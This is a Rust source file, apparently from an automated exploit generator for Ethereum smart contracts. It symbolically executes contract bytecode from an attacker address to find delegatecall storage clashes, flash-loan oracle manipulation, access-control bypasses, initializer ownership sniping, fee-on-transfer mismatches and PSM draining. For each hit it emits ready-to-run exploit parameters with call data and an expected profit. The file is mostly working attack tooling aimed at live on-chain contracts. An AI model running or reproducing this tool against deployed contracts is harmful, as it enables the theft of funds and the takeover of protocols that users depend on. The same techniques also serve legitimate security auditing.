impl ExploitObjective for DelegateCallStorageClashObjective {
    fn name(&self) -> &str {
        "DelegateCall Storage Clash (EIP-1967)"
    }

    fn execute(&self, bytecode: &Bytes) -> Option<ExploitParams> {
        run_with_z3_solver(|ctx, solver| {
            let rpc_url = self.rpc_url.clone();
            let mut scenario = crate::solver::setup::StandardScenario::try_new(
                ctx,
                solver,
                &rpc_url,
                bytecode,
                "delegatecall_clash_loan",
            )
            .ok()?;

            let selectors = crate::solver::setup::selectors_from_context_or_scan(bytecode);
            if selectors.is_empty() {
                return None;
            }

            for call_data in &selectors {
                let mut current_db = scenario.db.clone();
                let snapshot = scenario.machine.snapshot();

                scenario.machine.reset_calldata();
                scenario.machine.tx_id += 1;
                scenario.machine.reverted = false;
                scenario.machine.delegatecall_storage_clash_detected = false;

                {
                    let mut evm = Evm::builder()
                        .with_db(&mut current_db)
                        .with_external_context(&mut scenario.machine)
                        .append_handler_register(revm::inspector_handle_register)
                        .modify_tx_env(|tx| {
                            tx.caller = scenario.attacker;
                            tx.transact_to = TransactTo::Call(scenario.contract_addr);
                            tx.data = call_data.clone();
                            tx.value = U256::ZERO;
                            tx.gas_limit = 10_000_000;
                        })
                        .build();
                    let _ = evm.transact_commit();
                }

                if scenario.machine.delegatecall_storage_clash_detected {
                    scenario.machine.restore(&snapshot);
                    return Some(ExploitParams {
                        flash_loan_amount: U256::ZERO,
                        flash_loan_token: Address::ZERO,
                        flash_loan_provider: Address::ZERO,
                        flash_loan_legs: Vec::new(),
                        steps: vec![ExploitStep {
                            target: scenario.contract_addr,
                            call_data: call_data.clone(),
                            execute_if: None,
                        }],
                        expected_profit: Some(U256::from(1)),
                        block_offsets: None,
                    });
                }

                scenario.machine.restore(&snapshot);
            }

            None
        })
    }
}

/// Strategy 3: Oracle-Spot Discrepancy (Flash Loan -> Swap -> Privileged Action)
pub struct OracleSpotObjective {
    pub rpc_url: String,
    pub chain_id: u64,
    pub min_discrepancy_bps: u64,
    pub oracle_sanity_width_bps: u64,
}

fn collect_oracle_sources(deps: &[OracleDep]) -> (Vec<Address>, Vec<Address>) {
    let mut oracle_pairs: Vec<Address> = Vec::new();
    let mut chainlink_feeds: Vec<Address> = Vec::new();

    for dep in deps {
        match dep.kind {
            OracleType::UniV2Reserves => {
                if !oracle_pairs.contains(&dep.source) {
                    oracle_pairs.push(dep.source);
                }
            }
            OracleType::ChainlinkFeed => {
                if !chainlink_feeds.contains(&dep.source) {
                    chainlink_feeds.push(dep.source);
                }
            }
            _ => {}
        }
    }

    (oracle_pairs, chainlink_feeds)
}

impl ExploitObjective for OracleSpotObjective {
    fn name(&self) -> &str {
        "Oracle-Spot Discrepancy (Cross-Protocol)"
    }

    fn execute(&self, bytecode: &Bytes) -> Option<ExploitParams> {
        run_with_z3_solver(|ctx, solver| {
            let rpc_url = self.rpc_url.clone();
            let mut scenario = crate::solver::setup::StandardScenario::try_new(
                ctx,
                solver,
                &rpc_url,
                bytecode,
                "oracle_spot_loan",
            )
            .ok()?;
            scenario.constrain_loan(solver, "1000000000000000000000000");

            let mut selectors = crate::solver::setup::selectors_from_context_or_scan(bytecode);
            if selectors.is_empty() {
                selectors.push(Bytes::new());
            }

            // Phase 1: dependency discovery (which UniV2-like pairs are used as oracle inputs).
            // Probe a small selector set to keep this objective inside the 1800ms envelope.
            let probe_limit = selectors.len().min(6);
            for call_data in selectors.iter().take(probe_limit) {
                let snapshot = scenario.machine.snapshot();
                let mut probe_db = scenario.db.clone();
                {
                    let mut evm = Evm::builder()
                        .with_db(&mut probe_db)
                        .with_external_context(&mut scenario.machine)
                        .append_handler_register(revm::inspector_handle_register)
                        .modify_tx_env(|tx| {
                            tx.caller = scenario.attacker;
                            tx.transact_to = TransactTo::Call(scenario.contract_addr);
                            tx.data = call_data.clone();
                            tx.value = U256::ZERO;
                            tx.gas_limit = 10_000_000;
                        })
                        .build();
                    let _ = evm.transact_commit();
                }
                scenario.machine.restore(&snapshot);
            }

            let (oracle_pairs, chainlink_feeds) =
                collect_oracle_sources(&scenario.machine.oracle_deps);
            if oracle_pairs.is_empty() {
                return None;
            }

            let initial_tokens = scenario.init_tokens(self.chain_id, bytecode);
            let chainlink_probe_count = chainlink_feeds.len().min(3);

            for pair in oracle_pairs {
                // UniV2 reserves are packed at slot 8 for canonical pairs.
                let reserve_data = match scenario.db.storage(pair, U256::from(8u64)) {
                    Ok(val) => val,
                    Err(_) => continue,
                };

                let reserve_data_bv = crate::symbolic::z3_ext::bv_from_u256(ctx, reserve_data);
                let r0 = reserve_data_bv.extract(111, 0).zero_ext(144);
                let r1 = reserve_data_bv.extract(223, 112).zero_ext(144);
                if chainlink_probe_count > 0 {
                    for feed_idx in 0..chainlink_probe_count {
                        let dep_snapshot = scenario.machine.snapshot();
                        solver.push();

                        solver.assert(&r0.bvugt(&BV::from_u64(ctx, 0, 256)));
                        solver.assert(&r1.bvugt(&BV::from_u64(ctx, 0, 256)));

                        let amount_in = &scenario.flash_loan_amount;
                        solver.assert(&amount_in.bvugt(&BV::from_u64(ctx, 0, 256)));

                        let amount_out =
                            crate::protocols::uniswap_v2::get_amount_out(amount_in, &r0, &r1);
                        let r0_manip = r0.bvadd(amount_in);
                        solver.assert(&r0_manip.bvuge(&r0));
                        let r1_manip = r1.bvsub(&amount_out);

                        let chainlink_name = format!(
                            "chainlink_answer_{}_{}_{}",
                            scenario.machine.tx_id, pair, feed_idx
                        );
                        let chainlink_answer = BV::new_const(ctx, chainlink_name.as_str(), 256);
                        solver.assert(&chainlink_answer.bvugt(&zero(ctx)));

                        // Oracle sanity width: chainlink should remain near pre-manip spot.
                        let sane = ratio_gap_within_bps(
                            ctx,
                            &chainlink_answer,
                            &BV::from_u64(ctx, 1, 256),
                            &r1,
                            &r0,
                            self.oracle_sanity_width_bps,
                        );
                        solver.assert(&sane);

                        // Probe objective: manipulated spot must drift beyond oracle sanity envelope.
                        let lagged = ratio_gap_exceeds_bps(
                            ctx,
                            &r1_manip,
                            &r0_manip,
                            &chainlink_answer,
                            &BV::from_u64(ctx, 1, 256),
                            self.min_discrepancy_bps,
                        );
                        solver.assert(&lagged);

                        scenario
                            .machine
                            .manipulated_reserves
                            .insert(pair, (r0_manip, r1_manip));

                        let result = solve_market_invariant(
                            ctx,
                            solver,
                            &mut scenario.machine,
                            scenario.db.clone(),
                            &scenario.flash_loan_amount,
                            &scenario.flash_loan_parts,
                            scenario.attacker,
                            scenario.contract_addr,
                            0,
                            3,
                            &selectors,
                            &initial_tokens,
                        );

                        scenario.machine.restore(&dep_snapshot);
                        solver.pop(1);

                        if result.is_some() {
                            return result;
                        }
                    }
                } else {
                    let dep_snapshot = scenario.machine.snapshot();
                    solver.push();

                    solver.assert(&r0.bvugt(&BV::from_u64(ctx, 0, 256)));
                    solver.assert(&r1.bvugt(&BV::from_u64(ctx, 0, 256)));

                    let amount_in = &scenario.flash_loan_amount;
                    solver.assert(&amount_in.bvugt(&BV::from_u64(ctx, 0, 256)));

                    let amount_out =
                        crate::protocols::uniswap_v2::get_amount_out(amount_in, &r0, &r1);
                    let r0_manip = r0.bvadd(amount_in);
                    solver.assert(&r0_manip.bvuge(&r0));
                    let r1_manip = r1.bvsub(&amount_out);

                    // UniswapV2Oracle-style stale quote model: near pre-manip spot.
                    let uni_oracle_num_name =
                        format!("uni_v2_oracle_num_{}_{}", scenario.machine.tx_id, pair);
                    let uni_oracle_den_name =
                        format!("uni_v2_oracle_den_{}_{}", scenario.machine.tx_id, pair);
                    let uni_oracle_num = BV::new_const(ctx, uni_oracle_num_name.as_str(), 256);
                    let uni_oracle_den = BV::new_const(ctx, uni_oracle_den_name.as_str(), 256);
                    solver.assert(&uni_oracle_num.bvugt(&zero(ctx)));
                    solver.assert(&uni_oracle_den.bvugt(&zero(ctx)));

                    let sane = ratio_gap_within_bps(
                        ctx,
                        &uni_oracle_num,
                        &uni_oracle_den,
                        &r1,
                        &r0,
                        self.oracle_sanity_width_bps,
                    );
                    solver.assert(&sane);

                    let lagged = ratio_gap_exceeds_bps(
                        ctx,
                        &r1_manip,
                        &r0_manip,
                        &uni_oracle_num,
                        &uni_oracle_den,
                        self.min_discrepancy_bps,
                    );
                    solver.assert(&lagged);

                    scenario
                        .machine
                        .manipulated_reserves
                        .insert(pair, (r0_manip, r1_manip));

                    let result = solve_market_invariant(
                        ctx,
                        solver,
                        &mut scenario.machine,
                        scenario.db.clone(),
                        &scenario.flash_loan_amount,
                        &scenario.flash_loan_parts,
                        scenario.attacker,
                        scenario.contract_addr,
                        0,
                        3,
                        &selectors,
                        &initial_tokens,
                    );

                    scenario.machine.restore(&dep_snapshot);
                    solver.pop(1);

                    if result.is_some() {
                        return result;
                    }
                }
            }

            None
        })
    }
}

#[derive(Clone)]
struct SenderLiftTrace<'ctx> {
    success_execution: bool,
    reverted: bool,
    self_destructed: bool,
    visited_pcs: HashMap<usize, usize>,
    storage_writes: Vec<(BV<'ctx>, BV<'ctx>)>,
    created_contracts_len: usize,
}

fn ast_bv_eq(lhs: &BV<'_>, rhs: &BV<'_>) -> bool {
    lhs._eq(rhs).simplify().as_bool() == Some(true)
}

fn storage_writes_equivalent(lhs: &[(BV<'_>, BV<'_>)], rhs: &[(BV<'_>, BV<'_>)]) -> bool {
    if lhs.len() != rhs.len() {
        return false;
    }
    lhs.iter()
        .zip(rhs.iter())
        .all(|((lk, lv), (rk, rv))| ast_bv_eq(lk, rk) && ast_bv_eq(lv, rv))
}

fn has_high_value_state_change(trace: &SenderLiftTrace<'_>) -> bool {
    !trace.storage_writes.is_empty() || trace.self_destructed || trace.created_contracts_len > 0
}

fn sender_lift_equivalent(lhs: &SenderLiftTrace<'_>, rhs: &SenderLiftTrace<'_>) -> bool {
    lhs.success_execution == rhs.success_execution
        && lhs.reverted == rhs.reverted
        && lhs.self_destructed == rhs.self_destructed
        && lhs.visited_pcs == rhs.visited_pcs
        && lhs.created_contracts_len == rhs.created_contracts_len
        && storage_writes_equivalent(&lhs.storage_writes, &rhs.storage_writes)
}

fn constrained_positive_balance<'ctx>(
    ctx: &'ctx Context,
    balance: &BV<'ctx>,
    upper_bound: &BV<'ctx>,
) -> Bool<'ctx> {
    let gt_zero = balance.bvugt(&zero(ctx));
    let within_cap = balance.bvule(upper_bound);
    Bool::and(ctx, &[&gt_zero, &within_cap])
}

fn panic_payload_to_string(payload: &(dyn Any + Send)) -> String {
    if let Some(s) = payload.downcast_ref::<&str>() {
        (*s).to_string()
    } else if let Some(s) = payload.downcast_ref::<String>() {
        s.clone()
    } else {
        "non-string panic payload".to_string()
    }
}

fn execute_sender_trace<'ctx>(
    solver: &'ctx Solver<'ctx>,
    scenario: &mut crate::solver::setup::StandardScenario<'ctx>,
    caller: Address,
    call_data: &Bytes,
) -> SenderLiftTrace<'ctx> {
    let snapshot = scenario.machine.snapshot();
    let mut current_db = scenario.db.clone();
    solver.push();

    scenario.machine.reset_calldata();
    scenario.machine.tx_id += 1;
    scenario.machine.reverted = false;
    scenario.machine.self_destructed = false;
    scenario.machine.clear_visited_pcs();
    scenario.machine.storage_log.clear();
    scenario.machine.created_contracts.clear();

    let result;
    {
        let mut evm = Evm::builder()
            .with_db(&mut current_db)
            .with_external_context(&mut scenario.machine)
            .append_handler_register(revm::inspector_handle_register)
            .modify_tx_env(|tx| {
                tx.caller = caller;
                tx.transact_to = TransactTo::Call(scenario.contract_addr);
                tx.data = call_data.clone();
                tx.value = U256::ZERO;
                tx.gas_limit = 10_000_000;
            })
            .build();
        result = evm.transact_commit();
    }

    let success_execution = if let Ok(res) = result {
        matches!(res, revm::primitives::ExecutionResult::Success { .. })
    } else {
        false
    };

    let trace = SenderLiftTrace {
        success_execution,
        reverted: scenario.machine.reverted,
        self_destructed: scenario.machine.self_destructed,
        visited_pcs: scenario.machine.visited_pcs.clone(),
        storage_writes: scenario.machine.storage_log.clone(),
        created_contracts_len: scenario.machine.created_contracts.len(),
    };

    scenario.machine.restore(&snapshot);
    solver.pop(1);
    trace
}

/// Strategy 5: Access Control Bypass (Sender-Lifting)
/// Finds selectors whose path and high-value state effects are identical across different msg.sender values.
pub struct AccessControlBypassObjective {
    pub rpc_url: String,
}

impl ExploitObjective for AccessControlBypassObjective {
    fn name(&self) -> &str {
        "Access Control Boundary Scanner"
    }

    fn execute(&self, bytecode: &Bytes) -> Option<ExploitParams> {
        run_with_z3_solver(|ctx, solver| {
            let rpc_url = self.rpc_url.clone();
            let mut scenario = crate::solver::setup::StandardScenario::try_new(
                ctx,
                solver,
                &rpc_url,
                bytecode,
                "bypass_loan",
            )
            .ok()?;

            let hundred_eth = U256::from(100u64)
                .checked_mul(U256::from(10u64).pow(U256::from(18u64)))
                .unwrap_or(U256::ZERO);
            let contract_balance = crate::symbolic::z3_ext::bv_from_u256(ctx, hundred_eth);
            scenario
                .machine
                .balance_overrides
                .insert(scenario.contract_addr, contract_balance);

            let mut selectors = vec![
                Bytes::from_static(&crate::utils::selectors::WITHDRAW_FEES),
                Bytes::from_static(&crate::utils::selectors::EMERGENCY_WITHDRAW),
                Bytes::from_static(&crate::utils::selectors::SWEEP),
                Bytes::from_static(&crate::utils::selectors::WITHDRAW_TOKEN),
                Bytes::from_static(&crate::utils::selectors::WITHDRAW_UINT),
                Bytes::from_static(&crate::utils::selectors::WITHDRAW_ALL),
            ];
            selectors.extend(crate::solver::heuristics::scan_for_admin_patterns(bytecode));
            selectors.extend(crate::solver::setup::selectors_from_context_or_scan(
                bytecode,
            ));
            selectors.sort();
            selectors.dedup();

            if selectors.is_empty() {
                return None;
            }

            let privileged_sender = scenario.attacker;
            let outsider_sender = Address::new([0xCC; 20]);

            for call_data in &selectors {
                let privileged_trace =
                    execute_sender_trace(solver, &mut scenario, privileged_sender, call_data);
                let outsider_trace =
                    execute_sender_trace(solver, &mut scenario, outsider_sender, call_data);

                let sender_independent = sender_lift_equivalent(&privileged_trace, &outsider_trace);
                let high_value = has_high_value_state_change(&privileged_trace)
                    && has_high_value_state_change(&outsider_trace);
                let outsider_effective =
                    outsider_trace.success_execution && !outsider_trace.reverted;

                if sender_independent && high_value && outsider_effective {
                    return Some(ExploitParams {
                        flash_loan_amount: U256::ZERO,
                        flash_loan_token: Address::ZERO,
                        flash_loan_provider: Address::ZERO,
                        flash_loan_legs: Vec::new(),
                        steps: vec![ExploitStep {
                            target: scenario.contract_addr,
                            call_data: call_data.clone(),
                            execute_if: None,
                        }],
                        expected_profit: Some(U256::from(1u64)),
                        block_offsets: None,
                    });
                }
            }

            None
        })
    }
}

#[derive(Clone)]
struct InitializationRaceTrace<'ctx> {
    success_execution: bool,
    reverted: bool,
    storage_writes: Vec<(BV<'ctx>, BV<'ctx>)>,
}

fn execute_initialization_trace<'ctx>(
    solver: &'ctx Solver<'ctx>,
    scenario: &mut crate::solver::setup::StandardScenario<'ctx>,
    call_data: &Bytes,
) -> InitializationRaceTrace<'ctx> {
    let snapshot = scenario.machine.snapshot();
    let mut current_db = scenario.db.clone();
    solver.push();

    scenario.machine.reset_calldata();
    scenario.machine.tx_id += 1;
    scenario.machine.reverted = false;
    scenario.machine.storage_log.clear();

    let result;
    {
        let mut evm = Evm::builder()
            .with_db(&mut current_db)
            .with_external_context(&mut scenario.machine)
            .append_handler_register(revm::inspector_handle_register)
            .modify_tx_env(|tx| {
                tx.caller = scenario.attacker;
                tx.transact_to = TransactTo::Call(scenario.contract_addr);
                tx.data = call_data.clone();
                tx.value = U256::ZERO;
                tx.gas_limit = 10_000_000;
            })
            .build();
        result = evm.transact_commit();
    }

    let success_execution = if let Ok(res) = result {
        matches!(res, revm::primitives::ExecutionResult::Success { .. })
    } else {
        false
    };

    let trace = InitializationRaceTrace {
        success_execution,
        reverted: scenario.machine.reverted,
        storage_writes: scenario.machine.storage_log.clone(),
    };

    scenario.machine.restore(&snapshot);
    solver.pop(1);
    trace
}

fn has_low_slot_owner_takeover<'ctx>(
    ctx: &'ctx Context,
    solver: &'ctx Solver<'ctx>,
    storage_writes: &[(BV<'ctx>, BV<'ctx>)],
    attacker_word: &BV<'ctx>,
) -> bool {
    if storage_writes.is_empty() {
        return false;
    }

    for (slot, value) in storage_writes {
        solver.push();
        let slot_match = owner_slot_in_range(ctx, slot);
        solver.assert(&slot_match);
        solver.assert(&value._eq(attacker_word));
        let sat = solver.check() == z3::SatResult::Sat;
        solver.pop(1);
        if sat {
            return true;
        }
    }

    false
}

const OWNER_SLOT_RANGE_UPPER_BOUND: u64 = 3;

fn owner_slot_upper_bound_bv<'ctx>(ctx: &'ctx Context) -> BV<'ctx> {
    crate::symbolic::z3_ext::bv_from_u256(ctx, U256::from(OWNER_SLOT_RANGE_UPPER_BOUND))
}

fn owner_slot_in_range<'ctx>(ctx: &'ctx Context, slot: &BV<'ctx>) -> Bool<'ctx> {
    slot.bvule(&owner_slot_upper_bound_bv(ctx))
}

/// Strategy 6: Initialization Race Conditions (Ownership Sniping)
/// Detects uninitialized contracts where `initialize`/`init` can set owner to attacker.
pub struct InitializationRaceObjective {
    pub rpc_url: String,
}

impl ExploitObjective for InitializationRaceObjective {
    fn name(&self) -> &str {
        "Initialization Ownership Race"
    }

    fn execute(&self, bytecode: &Bytes) -> Option<ExploitParams> {
        run_with_z3_solver(|ctx, solver| {
            let rpc_url = self.rpc_url.clone();
            let mut scenario = crate::solver::setup::StandardScenario::try_new(
                ctx,
                solver,
                &rpc_url,
                bytecode,
                "init_race_loan",
            )
            .ok()?;

            let mut init_selectors: Vec<[u8; 4]> =
                crate::solver::setup::selectors_from_context_or_scan(bytecode)
                    .iter()
                    .filter_map(crate::protocols::init_race::selector_from_call_data)
                    .filter(|selector| {
                        crate::protocols::init_race::is_initialization_selector(*selector)
                    })
                    .collect();
            init_selectors.sort_unstable();
            init_selectors.dedup();

            if init_selectors.is_empty() {
                return None;
            }

            init_selectors.truncate(init_selectors.len().min(6));

            let attacker_u256 = U256::from_be_bytes(scenario.attacker.into_word().into());
            let attacker_word = crate::symbolic::z3_ext::bv_from_u256(ctx, attacker_u256);

            for selector in init_selectors {
                let payloads = crate::protocols::init_race::build_initializer_payloads(
                    selector,
                    scenario.attacker,
                );
                for call_data in payloads {
                    let trace = execute_initialization_trace(solver, &mut scenario, &call_data);
                    let ownership_latched = trace.success_execution
                        && !trace.reverted
                        && has_low_slot_owner_takeover(
                            ctx,
                            solver,
                            &trace.storage_writes,
                            &attacker_word,
                        );

                    if ownership_latched {
                        return Some(ExploitParams {
                            flash_loan_amount: U256::ZERO,
                            flash_loan_token: Address::ZERO,
                            flash_loan_provider: Address::ZERO,
                            flash_loan_legs: Vec::new(),
                            steps: vec![ExploitStep {
                                target: scenario.contract_addr,
                                call_data: call_data.clone(),
                                execute_if: None,
                            }],
                            expected_profit: Some(U256::from(1u64)),
                            block_offsets: None,
                        });
                    }
                }
            }

            None
        })
    }
}

#[derive(Clone)]
struct FeeOnTransferTrace<'ctx> {
    success_execution: bool,
    reverted: bool,
    storage_writes_len: usize,
    transfer_events: Vec<TokenTransferEvent<'ctx>>,
}

fn execute_fee_on_transfer_trace<'ctx>(
    solver: &'ctx Solver<'ctx>,
    scenario: &mut crate::solver::setup::StandardScenario<'ctx>,
    call_data: &Bytes,
) -> FeeOnTransferTrace<'ctx> {
    let snapshot = scenario.machine.snapshot();
    let mut current_db = scenario.db.clone();
    solver.push();

    scenario.machine.reset_calldata();
    scenario.machine.tx_id += 1;
    scenario.machine.reverted = false;
    scenario.machine.storage_log.clear();
    scenario.machine.token_transfer_events.clear();
    scenario.machine.fee_on_transfer_mode = true;

    let result;
    {
        let mut evm = Evm::builder()
            .with_db(&mut current_db)
            .with_external_context(&mut scenario.machine)
            .append_handler_register(revm::inspector_handle_register)
            .modify_tx_env(|tx| {
                tx.caller = scenario.attacker;
                tx.transact_to = TransactTo::Call(scenario.contract_addr);
                tx.data = call_data.clone();
                tx.value = U256::ZERO;
                tx.gas_limit = 10_000_000;
            })
            .build();
        result = evm.transact_commit();
    }

    let success_execution = if let Ok(res) = result {
        matches!(res, revm::primitives::ExecutionResult::Success { .. })
    } else {
        false
    };

    let trace = FeeOnTransferTrace {
        success_execution,
        reverted: scenario.machine.reverted,
        storage_writes_len: scenario.machine.storage_log.len(),
        transfer_events: scenario.machine.token_transfer_events.clone(),
    };

    scenario.machine.restore(&snapshot);
    solver.pop(1);
    trace
}

fn has_fee_on_transfer_accounting_mismatch<'ctx>(
    ctx: &'ctx Context,
    solver: &'ctx Solver<'ctx>,
    contract_addr: Address,
    trace: &FeeOnTransferTrace<'ctx>,
) -> bool {
    if trace.reverted || !trace.success_execution || trace.storage_writes_len == 0 {
        return false;
    }

    for event in &trace.transfer_events {
        if !event.via_transfer_from || event.to != contract_addr {
            continue;
        }
        solver.push();
        let shortfall = crate::protocols::fee_on_transfer::strict_received_shortfall(
            ctx,
            &event.requested_amount,
            &event.received_amount,
        );
        solver.assert(&shortfall);
        let sat = solver.check() == z3::SatResult::Sat;
        solver.pop(1);
        if sat {
            return true;
        }
    }

    false
}

/// Strategy 7: Fee-On-Transfer Accounting Mismatch
/// Detects paths where transferFrom receives less than requested while internal accounting mutates.
pub struct FeeOnTransferMismatchObjective {
    pub rpc_url: String,
}

impl ExploitObjective for FeeOnTransferMismatchObjective {
    fn name(&self) -> &str {
        "Fee-On-Transfer Accounting Mismatch"
    }

    fn execute(&self, bytecode: &Bytes) -> Option<ExploitParams> {
        run_with_z3_solver(|ctx, solver| {
            let rpc_url = self.rpc_url.clone();
            let mut scenario = crate::solver::setup::StandardScenario::try_new(
                ctx,
                solver,
                &rpc_url,
                bytecode,
                "fot_mismatch_loan",
            )
            .ok()?;

            let mut selectors: Vec<Bytes> =
                crate::protocols::fee_on_transfer::known_fee_sensitive_selectors()
                    .iter()
                    .map(|selector| Bytes::copy_from_slice(selector))
                    .collect();
            selectors.extend(crate::solver::setup::selectors_from_context_or_scan(
                bytecode,
            ));
            selectors.sort();
            selectors.dedup();

            if selectors.is_empty() {
                return None;
            }
            selectors.truncate(selectors.len().min(10));

            for call_data in &selectors {
                let trace = execute_fee_on_transfer_trace(solver, &mut scenario, call_data);
                if has_fee_on_transfer_accounting_mismatch(
                    ctx,
                    solver,
                    scenario.contract_addr,
                    &trace,
                ) {
                    return Some(ExploitParams {
                        flash_loan_amount: U256::ZERO,
                        flash_loan_token: Address::ZERO,
                        flash_loan_provider: Address::ZERO,
                        flash_loan_legs: Vec::new(),
                        steps: vec![ExploitStep {
                            target: scenario.contract_addr,
                            call_data: call_data.clone(),
                            execute_if: None,
                        }],
                        expected_profit: Some(U256::from(1u64)),
                        block_offsets: None,
                    });
                }
            }

            None
        })
    }
}

#[derive(Clone)]
struct PsmTrace<'ctx> {
    success_execution: bool,
    reverted: bool,
    storage_writes_len: usize,
    transfer_events: Vec<TokenTransferEvent<'ctx>>,
}

fn execute_psm_trace<'ctx>(
    solver: &'ctx Solver<'ctx>,
    scenario: &mut crate::solver::setup::StandardScenario<'ctx>,
    call_data: &Bytes,
) -> PsmTrace<'ctx> {
    let snapshot = scenario.machine.snapshot();
    let mut current_db = scenario.db.clone();
    solver.push();

    scenario.machine.reset_calldata();
    scenario.machine.tx_id += 1;
    scenario.machine.reverted = false;
    scenario.machine.storage_log.clear();
    scenario.machine.token_transfer_events.clear();
    scenario.machine.fee_on_transfer_mode = false;

    let result;
    {
        let mut evm = Evm::builder()
            .with_db(&mut current_db)
            .with_external_context(&mut scenario.machine)
            .append_handler_register(revm::inspector_handle_register)
            .modify_tx_env(|tx| {
                tx.caller = scenario.attacker;
                tx.transact_to = TransactTo::Call(scenario.contract_addr);
                tx.data = call_data.clone();
                tx.value = U256::ZERO;
                tx.gas_limit = 10_000_000;
            })
            .build();
        result = evm.transact_commit();
    }

    let success_execution = if let Ok(res) = result {
        matches!(res, revm::primitives::ExecutionResult::Success { .. })
    } else {
        false
    };

    let trace = PsmTrace {
        success_execution,
        reverted: scenario.machine.reverted,
        storage_writes_len: scenario.machine.storage_log.len(),
        transfer_events: scenario.machine.token_transfer_events.clone(),
    };

    scenario.machine.restore(&snapshot);
    solver.pop(1);
    trace
}

fn has_psm_drain_signal<'ctx>(
    ctx: &'ctx Context,
    solver: &'ctx Solver<'ctx>,
    attacker: Address,
    contract_addr: Address,
    min_gain_bps: u64,
    trace: &PsmTrace<'ctx>,
) -> bool {
    if trace.reverted || !trace.success_execution || trace.storage_writes_len == 0 {
        return false;
    }

    let inbound = trace
        .transfer_events
        .iter()
        .filter(|event| event.from == attacker && event.to == contract_addr)
        .collect::<Vec<_>>();
    let outbound = trace
        .transfer_events
        .iter()
        .filter(|event| event.from == contract_addr && event.to == attacker)
        .collect::<Vec<_>>();

    if inbound.is_empty() || outbound.is_empty() {
        return false;
    }

    for in_event in &inbound {
        for out_event in &outbound {
            if in_event.token == out_event.token {
                continue;
            }
            solver.push();
            let drain = crate::protocols::psm::psm_drain_ratio_exceeds_bps(
                ctx,
                &in_event.requested_amount,
                &out_event.received_amount,
                min_gain_bps,
            );
            solver.assert(&drain);
            let sat = solver.check() == z3::SatResult::Sat;
            solver.pop(1);
            if sat {
                return true;
            }
        }
    }

    false
}

/// Strategy 8: Peg Stability Module (PSM) Draining
/// Detects swap/redeem cycles where attacker outflow->inflow ratio drains backing beyond threshold.
pub struct PsmDrainingObjective {
    pub rpc_url: String,
    pub min_gain_bps: u64,
}
